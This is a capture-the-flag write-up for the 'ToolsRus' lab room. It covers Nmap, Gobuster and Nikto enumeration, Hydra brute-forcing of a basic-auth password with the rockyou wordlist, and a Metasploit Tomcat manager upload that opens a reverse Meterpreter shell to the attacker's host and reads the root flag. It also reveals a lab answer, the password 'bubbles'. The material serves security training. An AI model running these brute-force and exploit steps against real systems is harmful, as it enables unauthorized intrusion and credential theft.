
# ToolsRus

## Description
My challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

This room will introduce you to the following tools: 

Dirbuster
Hydra
Nmap
Nikto
Metasploit

## Challenge

### Method

*Nmap*

`nmap -sV -sC -A 10.10.231.52`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:5c:8c:5b:d8:75:4d:f5:66:7b:c3:53:4b:36:b5:86 (RSA)
|   256 21:14:24:9b:29:92:ef:58:99:6d:cb:55:8d:5a:ea:d4 (ECDSA)
|_  256 83:ef:79:a3:b1:41:3b:2f:a8:9e:63:4b:e8:dc:0f:25 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:5E:E2:01:03:FB (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/2%OT=22%CT=1%CU=33065%PV=Y%DS=1%DC=D%G=Y%M=025EE2%TM
OS:=660B5DE9%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)
OS:SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M230
OS:1ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)W
OS:IN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6
OS:903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

1. What directory can you find, that begins with a "g"?

*Dirbuster/Gobuster*

`gobuster dir -u http://10.10.204.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

2. Whose name can you find from this directory?

Just open page from previous qustion

3. What directory has basic authentication?

Directory from first question, that begins with a "p"

4. What is bob's password to the protected part of the website?

*Hydra*

`hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.204.45 http-get /p*******/`

5. What other port that serves a webs service is open on the machine?

We already have Nmap results, just choose another port =)

6. What is the name and version of the software running on the port from question 5?

Check Nmap output again

7. How many documentation files did Nikto identify?
Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

`nikto -h http://10.10.204.45:1234/manager/html -id "[QUESTION 2]:[Question 4]"`
There is a lot of output

8. What is the server version?

*Nmap/Nikto*

80/tcp   open  http    Apache httpd [REDACTED] ((Ubuntu))

9. What version of Apache-Coyote is this service using?

*Nmap*

1234/tcp open  http    Apache Tomcat/Coyote JSP engine [REDACTED]

10. What user did you get a shell as?
What user did you get a shell as?

*Metasploit*

```
msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.204.45
RHOSTS => 10.10.204.45
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.10.73.91:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying T6Jti7Nrp...
[*] Executing T6Jti7Nrp...
[*] Undeploying T6Jti7Nrp ...
[*] Sending stage (58851 bytes) to 10.10.204.45
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.73.91:4444 -> 10.10.204.45:42384) at 2024-04-02 03:10:39 +0100

meterpreter > getuid

```

11. What flag is found in the root directory?

```
meterpreter > cat /root/flag.txt
```
